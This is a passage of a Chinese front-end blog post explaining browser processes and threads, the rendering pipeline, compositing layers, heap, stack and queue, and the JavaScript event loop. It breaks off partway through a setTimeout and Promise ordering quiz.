CPU资源分配的最小单位（是能拥有资源和独立运行的最小单位）</li><li><code>线程</code>是 CPU调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）</li></ul><p>eg:<br><img src="/2019/04/28/Event Loop/process.jpg" alt="process"></p><ul><li>进程好比图中的工厂，有单独的专属自己的工厂资源。</li><li>线程好比图中的工人，多个工人在一个工厂中协作工作，工厂与工人是 1:n的关系。也就是说一个进程由一个或多个线程组成，线程是一个进程中代码的不同执行路线；</li><li>工厂的空间是工人们共享的，这象征一个进程的内存空间是共享的，每个线程都可用这些共享内存。</li><li>多个工厂之间独立存在。</li></ul><p>tips</p><ul><li>不同进程之间也可以通信，不过代价较大</li><li>现在，一般通用的叫法：单线程与多线程，都是指在一个进程内的单和多。（所以核心还是得属于一个进程才行）</li></ul><p>2.多进程与多线程</p><ul><li>多进程：在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态。多进程带来的好处是明显的，比如你可以听歌的同时，打开编辑器敲代码，编辑器和听歌软件的进程之间丝毫不会相互干扰。</li><li>多线程：程序中包含多个执行流，即在一个程序中可以同时运行多个不同的线程来执行不同的任务，也就是说允许单个程序创建多个并行执行的线程来完成各自的任务。</li></ul><p>以Chrome浏览器中为例，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程（下文会详细介绍），比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁。</p><h3 id="浏览器是多进程的"><a href="#浏览器是多进程的" class="headerlink" title="浏览器是多进程的"></a>浏览器是多进程的</h3><p>了解了线程和进程的区别后，接下来我们对浏览器进行一定程度上的认识</p><ul><li>浏览器是多进程的</li><li>浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存）</li><li>简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。</li></ul><p>关于以上几点的验证，请再看下面这张图：</p><p><img src="/2019/04/28/Event Loop/chrome-process.jpg" alt="chrome-process"></p><p>图中打开了Chrome浏览器的多个标签页，然后可以在Chrome的任务管理器中看到有多个进程（分别是每一个Tab页面有一个独立的进程，以及一个主进程）。 感兴趣的可以自行尝试下，如果再多打开一个Tab页，进程正常会+1以上</p><p><strong>注意：</strong>在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的）</p><h4 id="浏览器都包含哪些进程？"><a href="#浏览器都包含哪些进程？" class="headerlink" title="浏览器都包含哪些进程？"></a>浏览器都包含哪些进程？</h4><p>知道了浏览器是多进程后，再来看看它到底包含哪些进程：（为了简化理解，仅列举主要进程）</p><p>1.Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有</p><ul><li>负责浏览器界面显示，与用户交互。如前进，后退等</li><li>负责各个页面的管理，创建和销毁其他进程</li><li>将Renderer进程得到的内存中的Bitmap，绘制到用户界面上</li><li>网络资源的管理，下载等</li></ul><p>2.第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建</p><p>3.GPU进程：最多一个，用于3D绘制等</p><p>4.浏览器渲染进程（浏览器内核）（Renderer进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为</p><ul><li>页面渲染，脚本执行，事件处理等</li></ul><p>强化记忆：在浏览器中打开一个网页相当于新起了一个进程（进程内有自己的多线程）</p><p>当然，浏览器有时会将多个进程合并（譬如打开多个空白标签页后，会发现多个空白标签页被合并成了一个进程），如图</p><p><img src="/2019/04/28/Event Loop/chrome-merge-process.jpg" alt="chrome-merge-process"></p><h4 id="浏览器多进程的优势"><a href="#浏览器多进程的优势" class="headerlink" title="浏览器多进程的优势"></a>浏览器多进程的优势</h4><p>相比于单进程浏览器，多进程有如下优点：</p><ul><li>避免单个page crash影响整个浏览器</li><li>避免第三方插件crash影响整个浏览器</li><li>多进程充分利用多核优势</li><li>方便使用沙盒模型隔离插件等进程，提高浏览器稳定性</li></ul><p>简单点理解：如果浏览器是单进程，那么某个Tab页崩溃了，就影响了整个浏览器，体验有多差；同理如果是单进程，插件崩溃了也会影响整个浏览器；而且多进程还有其它的诸多优势。。。</p><p>当然，内存等资源消耗也会更大，有点空间换时间的意思。</p><h4 id="浏览器内核（渲染进程）"><a href="#浏览器内核（渲染进程）" class="headerlink" title="浏览器内核（渲染进程）"></a>浏览器内核（渲染进程）</h4><p>我们可以看到，上面提到了这么多的进程，那么，对于普通的前端操作来说，最重要的是什么呢？答案是<code>渲染进程</code></p><p>可以这样理解，页面的渲染，JS的执行，事件的循环，都在这个进程内进行。接下来重点分析这个进程</p><p><strong>请牢记，浏览器的渲染进程是多线程的（这点如果不理解，请回头看进程和线程的区分）</strong></p><p>接下来看看它都包含了哪些线程（列举一些主要常驻线程）：</p><p>1.GUI渲染线程</p><ul><li>负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。</li><li>当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行</li><li>注意，GUI渲染线程与JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。</li></ul><p>2.JS引擎线程</p><ul><li>也称为JS内核，负责处理Javascript脚本程序。（例如V8引擎）</li><li>JS引擎线程负责解析Javascript脚本，运行代码。</li><li>JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序</li><li>同样注意，GUI渲染线程与JS引擎线程是互斥的，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。</li></ul><p>3.事件触发线程</p><ul><li>归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助）</li><li>当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中</li><li>当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理</li><li>注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）</li></ul><p>4.定时触发器线程</p><ul><li>传说中的setInterval与setTimeout所在线程</li><li>浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确）</li><li>因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行）</li><li>注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。</li></ul><p>5.异步http请求线程</p><ul><li>在XMLHttpRequest在连接后是通过浏览器新开一个线程请求</li><li>将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。</li></ul><p><img src="/2019/04/28/Event Loop/blink-process.jpg" alt="blink-process"></p><h4 id="为什么-JavaScript-是单线程的？"><a href="#为什么-JavaScript-是单线程的？" class="headerlink" title="为什么 JavaScript 是单线程的？"></a>为什么 JavaScript 是单线程的？</h4><p>我们都知道Javascript是一门单线程的语言（即同一时间只能做一件事），因为 JavaScript 生来作为浏览器脚本语言，主要用来处理与用户的交互、网络以及操作 DOM。这就决定了它只能是单线程的，否则会带来很复杂的同步问题。  </p><p>假设 JavaScript 有两个线程，一个线程在某个 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？</p><p>既然 Javascript 是单线程的，它就像是只有一个窗口的银行，客户不得不排队一个一个的等待办理。同理 JavaScript 的任务也要一个接一个的执行，如果某个任务（比如加载高清图片）是个耗时任务，那浏览器岂不得一直卡着？为了防止主线程的阻塞，JavaScript 有了 同步 和 异步 的概念。</p><h4 id="Browser进程和浏览器内核（Renderer进程）的通信过程"><a href="#Browser进程和浏览器内核（Renderer进程）的通信过程" class="headerlink" title="Browser进程和浏览器内核（Renderer进程）的通信过程"></a>Browser进程和浏览器内核（Renderer进程）的通信过程</h4><p>看到这里，首先，应该对浏览器内的进程和线程都有一定理解了，那么接下来，再谈谈浏览器的Browser进程（控制进程）是如何和内核通信的， 这点也理解后，就可以将这部分的知识串联起来，从头到尾有一个完整的概念。</p><p>如果自己打开任务管理器，然后打开一个浏览器，就可以看到：任务管理器中出现了两个进程（一个是主控进程，一个则是打开Tab页的渲染进程）， 然后在这前提下，看下整个的过程：(简化了很多)</p><ul><li>Browser进程收到用户请求，首先需要获取页面内容（譬如通过网络下载资源），随后将该任务通过RendererHost接口传递给Render进程</li><li>Renderer进程的Renderer接口收到消息，简单解释后，交给渲染线程，然后开始渲染<ul><li>渲染线程接收请求，加载网页并渲染网页，这其中可能需要Browser进程获取资源和需要GPU进程来帮助渲染</li><li>当然可能会有JS线程操作DOM（这样可能会造成回流并重绘）</li><li>最后Render进程将结果传递给Browser进程</li></ul></li><li>Browser进程接收到结果并将结果绘制出来</li></ul><p><img src="/2019/04/28/Event Loop/bgr.jpg" alt="bgr"></p><p>看完这一整套流程，应该对浏览器的运作有了一定理解了，这样有了知识架构的基础后，后续就方便往上填充内容。</p><p>这块再往深处讲的话就涉及到浏览器内核源码解析了，不属于本文范围。</p><p>如果这一块要深挖，建议去读一些浏览器内核源码解析文章，或者可以先看看参考下来源中的第一篇文章，写的不错</p><h3 id="梳理浏览器内核中线程之间的关系"><a href="#梳理浏览器内核中线程之间的关系" class="headerlink" title="梳理浏览器内核中线程之间的关系"></a>梳理浏览器内核中线程之间的关系</h3><p>通过以上的学习，已经对浏览器的运行有了一个整体的概念，接下来，先简单梳理一些概念</p><h4 id="GUI渲染线程与JS引擎线程互斥"><a href="#GUI渲染线程与JS引擎线程互斥" class="headerlink" title="GUI渲染线程与JS引擎线程互斥"></a>GUI渲染线程与JS引擎线程互斥</h4><p>由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。</p><p>因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起， GUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。</p><h4 id="JS阻塞页面加载"><a href="#JS阻塞页面加载" class="headerlink" title="JS阻塞页面加载"></a>JS阻塞页面加载</h4><p>从上述的互斥关系，可以推导出，JS如果执行时间过长就会阻塞页面。</p><p>譬如，假设JS引擎正在进行巨量的计算，此时就算GUI有更新，也会被保存到队列中，等待JS引擎空闲后执行。 然后，由于巨量计算，所以JS引擎很可能很久很久后才能空闲，自然会感觉到巨卡无比。</p><p>所以，要尽量避免JS执行时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。</p><h4 id="WebWorker，JS的多线程？"><a href="#WebWorker，JS的多线程？" class="headerlink" title="WebWorker，JS的多线程？"></a>WebWorker，JS的多线程？</h4><p>前文中有提到JS引擎是单线程的，而且JS执行时间过长会阻塞页面，那么JS就真的对cpu密集型计算无能为力么？</p><p>所以，后来HTML5中支持了Web Worker。</p><p>MDN的官方解释是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面</span><br><span class="line"></span><br><span class="line">一个worker是使用一个构造函数创建的一个对象(e.g. Worker()) 运行一个命名的JavaScript文件 </span><br><span class="line"></span><br><span class="line">这个文件包含将在工作线程中运行的代码; workers 运行在另一个全局上下文中,不同于当前的window</span><br><span class="line"></span><br><span class="line">因此，使用 window快捷方式获取当前全局的范围 (而不是self) 在一个 Worker 内将返回错误</span><br></pre></td></tr></table></figure></p><p>这样理解下：</p><ul><li>创建Worker时，JS引擎向浏览器申请开一个子线程（子线程是浏览器开的，完全受主线程控制，而且不能操作DOM）</li><li>JS引擎线程与worker线程间通过特定的方式通信（postMessage API，需要通过序列化对象来与线程交互特定的数据）</li></ul><p>所以，如果有非常耗时的工作，请单独开一个Worker线程，这样里面不管如何翻天覆地都不会影响JS引擎主线程， 只待计算出结果后，将结果通信给主线程即可，perfect!</p><p>而且注意下，JS引擎是单线程的，这一点的本质仍然未改变，Worker可以理解是浏览器给JS引擎开的外挂，专门用来解决那些大量计算问题。</p><h4 id="WebWorker与SharedWorker"><a href="#WebWorker与SharedWorker" class="headerlink" title="WebWorker与SharedWorker"></a>WebWorker与SharedWorker</h4><p>既然都到了这里，就再提一下SharedWorker（避免后续将这两个概念搞混）</p><ul><li>WebWorker只属于某个页面，不会和其他页面的Render进程（浏览器内核进程）共享<ul><li>所以Chrome在Render进程中（每一个Tab页就是一个render进程）创建一个新的线程来运行Worker中的JavaScript程序。</li></ul></li><li>SharedWorker是浏览器所有页面共享的，不能采用与Worker同样的方式实现，因为它不隶属于某个Render进程，可以为多个Render进程共享使用<ul><li>所以Chrome浏览器为SharedWorker单独创建一个进程来运行JavaScript程序，在浏览器中每个相同的JavaScript只存在一个SharedWorker进程，不管它被创建多少次。</li></ul></li></ul><p>看到这里，应该就很容易明白了，本质上就是进程和线程的区别。SharedWorker由独立的进程管理，WebWorker只是属于render进程下的一个线程</p><h3 id="简单梳理下浏览器渲染流程"><a href="#简单梳理下浏览器渲染流程" class="headerlink" title="简单梳理下浏览器渲染流程"></a>简单梳理下浏览器渲染流程</h3><p>本来是直接计划开始谈JS运行机制的，但想了想，既然上述都一直在谈浏览器，直接跳到JS可能再突兀，因此，中间再补充下浏览器的渲染流程（简单版本）</p><p>为了简化理解，前期工作直接省略成：（要展开的或完全可以写另一篇超长文）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 浏览器输入url，浏览器主进程接管，开一个下载线程，</span><br><span class="line">然后进行 http请求（略去DNS查询，IP寻址等等操作），然后等待响应，获取内容，</span><br><span class="line">随后将内容通过RendererHost接口转交给Renderer进程</span><br><span class="line"></span><br><span class="line">- 浏览器渲染流程开始</span><br></pre></td></tr></table></figure></p><p>浏览器器内核拿到内容后，渲染大概可以划分成以下几个步骤：</p><p>1.解析html建立dom树<br>2.解析css构建render树（将CSS代码解析成树形的数据结构，然后结合DOM合并成render树）<br>3.布局render树（Layout/reflow），负责各元素尺寸、位置的计算<br>4.绘制render树（paint），绘制页面像素信息<br>5.浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上。</p><p>所有详细步骤都已经略去，渲染完毕后就是load事件了，之后就是自己的JS逻辑处理了</p><p>既然略去了一些详细的步骤，那么就提一些可能需要注意的细节把。</p><p><img src="/2019/04/28/Event Loop/rendering.jpg" alt="rendering"></p><h4 id="load事件与DOMContentLoaded事件的先后"><a href="#load事件与DOMContentLoaded事件的先后" class="headerlink" title="load事件与DOMContentLoaded事件的先后"></a>load事件与DOMContentLoaded事件的先后</h4><p>上面提到，渲染完毕后会触发load事件，那么你能分清楚load事件与DOMContentLoaded事件的先后么</p><p>很简单，知道它们的定义就可以了：</p><ul><li>当 DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片。 (譬如如果有async加载的脚本就不一定完成)</li><li>当 onload 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。 （渲染完毕了）</li></ul><p>所以，顺序是：DOMContentLoaded -&gt; load</p><h4 id="css加载是否会阻塞dom树渲染？"><a href="#css加载是否会阻塞dom树渲染？" class="headerlink" title="css加载是否会阻塞dom树渲染？"></a>css加载是否会阻塞dom树渲染？</h4><p>这里说的是头部引入css的情况</p><p>首先，我们都知道：css是由单独的下载线程异步下载的。</p><p>然后再说下几个现象：</p><ul><li>css加载不会阻塞DOM树解析（异步加载时DOM照常构建）</li><li>但会阻塞render树渲染（渲染时需等css加载完毕，因为render树需要css信息）</li></ul><p>这可能也是浏览器的一种优化机制。</p><p>因为你加载css的时候，可能会修改下面DOM节点的样式，<br>如果css加载不阻塞render树渲染的话，那么当css加载完之后，<br>render树可能又得重新重绘或者回流了，这就造成了一些没有必要的损耗。<br>所以干脆就先把DOM树的结构先解析完，把可以做的工作做完，然后等你css加载完之后，<br>在根据最终的样式来渲染render树，这种做法性能方面确实会比较好一点。</p><h4 id="普通图层和复合图层"><a href="#普通图层和复合图层" class="headerlink" title="普通图层和复合图层"></a>普通图层和复合图层</h4><p>渲染步骤中就提到了composite概念。</p><p>可以简单的这样理解，浏览器渲染的图层一般包含两大类：普通图层以及复合图层</p><p>首先，普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）</p><p>其次，absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于默认复合层。</p><p>然后，可以通过硬件加速的方式，声明一个新的复合图层，它会单独分配资源 （当然也会脱离普通文档流，这样一来，不管这个复合图层中怎么变化，也不会影响默认复合层里的回流重绘）</p><p>可以简单理解下：GPU中，各个复合图层是单独绘制的，所以互不影响，这也是为什么某些场景硬件加速效果一级棒</p><p>可以Chrome源码调试 -&gt; More Tools -&gt; Rendering -&gt; Layer borders中看到，黄色的就是复合图层信息</p><p>如下图。可以验证上述的说法</p><p><img src="/2019/04/28/Event Loop/layer-borders.jpg" alt="layer-borders"></p><h4 id="如何变成复合图层（硬件加速）"><a href="#如何变成复合图层（硬件加速）" class="headerlink" title="如何变成复合图层（硬件加速）"></a>如何变成复合图层（硬件加速）</h4><p>将该元素变成一个复合图层，就是传说中的硬件加速技术</p><ul><li>最常用的方式：translate3d、translateZ </li><li>opacity属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态）</li><li>will-chang属性（这个比较偏僻），一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层）， 作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放）</li><li><code>&lt;video&gt;&lt;iframe&gt;&lt;canvas&gt;&lt;webgl&gt;</code>等元素</li><li>其它，譬如以前的flash插件</li></ul><p><strong>absolute和硬件加速的区别</strong></p><p>可以看到，absolute虽然可以脱离普通文档流，但是无法脱离默认复合层。<br>所以，就算absolute中信息改变时不会改变普通文档流中render树，<br>但是，浏览器最终绘制时，是整个复合层绘制的，所以absolute中信息的改变，仍然会影响整个复合层的绘制。<br>（浏览器会重绘它，如果复合层中内容多，absolute带来的绘制信息变化过大，资源消耗是非常严重的）</p><p>而硬件加速直接就是在另一个复合层了（另起炉灶），所以它的信息改变不会影响默认复合层 （当然了，内部肯定会影响属于自己的复合层），仅仅是引发最后的合成（输出视图）</p><p><strong>硬件加速时请使用index</strong></p><p>使用硬件加速时，尽可能的使用index，防止浏览器默认给后续的元素创建复合层渲染</p><p>具体的原理时这样的：<br>webkit CSS3中，如果这个元素添加了硬件加速，并且index层级比较低，<br>那么在这个元素的后面其它元素（层级比这个元素高的，或者相同的，并且releative或absolute属性相同的），<br>会默认变为复合层渲染，如果处理不当会极大的影响性能</p><p>简单点理解，其实可以认为是一个隐式合成的概念：如果a是一个复合图层，而且b在a上面，那么b也会被隐式转为一个复合图层，这点需要特别注意</p><p>另外，这个问题可以在这个地址看到重现（原作者分析的挺到位的，直接上链接）：<a href="http://web.jobbole.com/83575/" target="_blank" rel="noopener">http://web.jobbole.com/83575/</a></p><p><a href="https://www.cnblogs.com/PeunZhang/p/3510083.html" target="_blank" rel="noopener">CSS3硬件加速需注意事项</a></p><h3 id="堆，栈、队列"><a href="#堆，栈、队列" class="headerlink" title="堆，栈、队列"></a>堆，栈、队列</h3><p><img src="/2019/04/28/Event Loop/heap-stack-queue01.jpg" alt="heap-stack-queue" title="堆，栈、队列"></p><p><strong>堆（Heap）</strong></p><p><strong>堆</strong>是一种数据结构，是利用完全二叉树维护的一组数据，<strong>堆</strong>分为两种，一种为最大堆，一种为最小堆，将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。<br>堆是线性数据结构，相当于一维数组，有唯一后继。</p><p>最大堆 eg:</p><p><img src="/2019/04/28/Event Loop/max-heap.jpg" alt="max-heap" title="最大堆"></p><p><strong>栈（Stack）</strong></p><blockquote><p>后进先出，存储基本数据类型和对象的指针，有 push() 和 pop() 这两个方法</p></blockquote><p><strong>栈</strong>在计算机科学中是限定仅在表尾进行插入或删除操作的线性表。 <strong>栈</strong>是一种数据结构，它按照后进先出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据<br><strong>栈</strong>是只能在某一端插入和删除的特殊线性表。</p><p><img src="/2019/04/28/Event Loop/stack.jpg" alt="stack" title="栈"></p><blockquote><p>JavaScript 中的内存分为 堆内存 (heap) 和 栈内存 (stack)</p></blockquote><p>JavaScript 中引用类型值的大小是不固定的，因此它们会被存储到 堆内存 中。JavaScript 不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间，而是操作 对象的引用。</p><p>而 JavaScript 中的基础数据类型都有固定的大小，因此它们被存储到 栈内存 中，由系统自动分配存储空间。我们可以直接操作保存在栈内存空间的值，因此基础数据类型都是 按值访问。此外，栈内存还会存储 对象的引用 (指针) 以及 函数执行时的运行空间。</p><p>两种存储方式的不同:</p><table><thead><tr><th>栈内存</th><th>堆内存</th></tr></thead><tbody><tr><td>存储基础数据类型</td><td>存储引用数据类型</td></tr><tr><td>按值访问</td><td>按引用访问</td></tr><tr><td>存储的值大小固定</td><td>存储的值大小不定，可动态调整</td></tr><tr><td>由系统自动分配内存空间</td><td>由程序员通过代码进行分配</td></tr><tr><td>主要用来执行程序</td><td>主要用来存放对象</td></tr><tr><td>空间小，运行效率高</td><td>空间大，但是运行效率相对较低</td></tr><tr><td>先进后出，后进先出</td><td>无序存储，可根据引用直接获取</td></tr></tbody></table><p><strong>队列（Queue）</strong></p><blockquote><p>后进后出，有 shift() 和 unshift() 这两个方法</p></blockquote><p>特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，<strong>队列</strong>是一种操作受限制的线性表。<br>进行插入操作的端称为队尾，进行删除操作的端称为队头。 <strong>队列</strong>中没有元素时，称为空队列。  </p><p><strong>队列</strong>的数据元素又称为<strong>队列元素</strong>。在队列中插入一个队列元素称为入队，从队列中删除一个队列元素称为出队。因为队列只允许在一端插入，在另一端删除，所以只有最早进入队列的元素才能最先从队列中删除，故队列又称为先进先出（FIFO—first in first out）</p><p><img src="/2019/04/28/Event Loop/queue.jpg" alt="queue" title="队列"></p><h3 id="Event-Loop-1"><a href="#Event-Loop-1" class="headerlink" title="Event Loop"></a>Event Loop</h3><p>在<code>JavaScript</code>中，任务被分为两种，一种宏任务（<code>MacroTask</code>）也叫<code>Task</code>，一种叫微任务（<code>MicroTask</code>）。</p><p><strong>MacroTask（宏任务）</strong></p><ul><li><code>script</code>全部代码、<code>setTimeout</code>、<code>setInterval</code>、<code>setImmediate</code>（Node.js,浏览器暂时不支持，只有IE10支持，具体可见MDN）、<code>I/O</code>、<code>UI Rendering</code>、<code>postMessage</code>、<code>MessageChannel</code>、<code>requestAnimationFrame</code>。</li></ul><table><thead><tr><th>#</th><th style="text-align:center">浏览器</th><th style="text-align:center">Node</th></tr></thead><tbody><tr><td>I/O</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>setTimeout</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>setInterval</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>setImmediate</td><td style="text-align:center">❌</td><td style="text-align:center">✅</td></tr><tr><td>postMessage</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>MessageChannel</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>requestAnimationFrame</td><td style="text-align:center">✅</td><td style="text-align:center">❌</td></tr><tr><td>UI Rendering</td><td style="text-align:center">✅</td><td style="text-align:center">❌</td></tr></tbody></table><p>有些地方会列出来<code>UI Rendering</code>，说这个也是宏任务，可是在<a href="https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model" target="_blank" rel="noopener">HTML规范文档</a>中，发现这很显然是和微任务平行的一个操作步骤</p><p><code>requestAnimationFrame</code>姑且也算是宏任务吧，<code>requestAnimationFrame</code>在MDN的定义为，下次页面重绘前所执行的操作，而重绘也是作为宏任务的一个步骤来存在的，且该步骤晚于微任务的执行</p><p><strong>MicroTask（微任务）</strong></p><ul><li><code>Process.nextTick</code>（Node.js）、<code>Promise.then catch finally</code>、<code>Object.observe</code>(废弃)、<code>MutationObserver</code>（<a href="http://javascript.ruanyifeng.com/dom/mutationobserver.html" target="_blank" rel="noopener">具体使用方式查看这里</a>）</li></ul><table><thead><tr><th>#</th><th style="text-align:center">浏览器</th><th style="text-align:center">Node</th></tr></thead><tbody><tr><td>process.nextTick</td><td style="text-align:center">❌</td><td style="text-align:center">✅</td></tr><tr><td>Promise.then catch finally</td><td style="text-align:center">✅</td><td style="text-align:center">✅</td></tr><tr><td>MutationObserver</td><td style="text-align:center">✅</td><td style="text-align:center">❌</td></tr><tr><td>Object.observe</td><td style="text-align:center">✅</td><td style="text-align:center">❌</td></tr></tbody></table><h3 id="浏览器中的Event-Loop"><a href="#浏览器中的Event-Loop" class="headerlink" title="浏览器中的Event Loop"></a>浏览器中的Event Loop</h3><ul><li>JS分为同步任务和异步任务</li><li>同步任务都在主线程上执行，形成一个执行栈</li><li>主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。</li><li>一旦执行栈中的所有同步任务执行完毕（此时JS引擎空闲），系统就会读取任务队列，将可运行的异步任务添加到可执行栈中，开始执行。</li></ul><h4 id="执行栈"><a href="#执行栈" class="headerlink" title="执行栈"></a>执行栈</h4><p>当我们调用一个方法的时候，JavaScript 会生成一个与这个方法对应的执行环境，又叫执行上下文(context)。这个执行环境中保存着该方法的私有作用域、上层作用域(作用域链)、方法的参数，以及这个作用域中定义的变量和 this 的指向，而当一系列方法被依次调用的时候。由于 JavaScript 是单线程的，这些方法就会按顺序被排列在一个单独的地方，这个地方就是所谓执行栈。<br>JS调用栈采用的是后进先出的规则，当函数执行的时候，会被添加到栈的顶部，当执行栈执行完成后，就会从栈顶移出，直到栈内被清空。</p><h4 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h4><p>事件队列是一个存储着 异步任务 的队列，其中的任务严格按照时间先后顺序执行，排在队头的任务将会率先执行，而排在队尾的任务会最后执行。事件队列每次仅执行一个任务，在该任务执行完毕之后，再执行下一个任务。执行栈则是一个类似于函数调用栈的运行容器，当执行栈为空时，JS 引擎便检查事件队列，如果事件队列不为空的话，事件队列便将第一个任务压入执行栈中运行。</p><h4 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h4><p>我们注意到，在异步代码完成后仍有可能要在一旁等待，因为此时程序可能在做其他的事情，等到程序空闲下来才有时间去看哪些异步已经完成了。所以 JavaScript 有一套机制去处理同步和异步操作，那就是事件循环 (Event Loop)。</p><p><img src="/2019/04/28/Event Loop/event-loop.jpg" alt="event-loop" title="Event Loop 过程"></p><ul><li>执行栈在执行完同步任务后，查看执行栈是否为空，如果执行栈为空，就会去检查微任务(microTask)队列是否为空，如果为空的话，就执行Task（宏任务），否则就一次性执行完所有微任务。</li><li>每次单个宏任务执行完毕后，检查微任务(microTask)队列是否为空，如果不为空的话，会按照先入先出的规则全部执行完微任务(microTask)后，设置微任务(microTask)队列为null，然后再执行宏任务，如此循环。</li></ul><p><strong>测试题01</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'A'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  func: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'B'</span>);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'C'</span>);</span><br><span class="line">      resolve();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">obj.func().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'D'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'E'</span>);</span><br></pre></td></tr></table></figure><ul><li>第一个 setTimeout 放到宏任务队列，此时宏任务队列为 [‘A’]</li><li>接着执行 obj 的 func 方法，将 setTimeout 放到宏任务队列，此时宏任务队列为 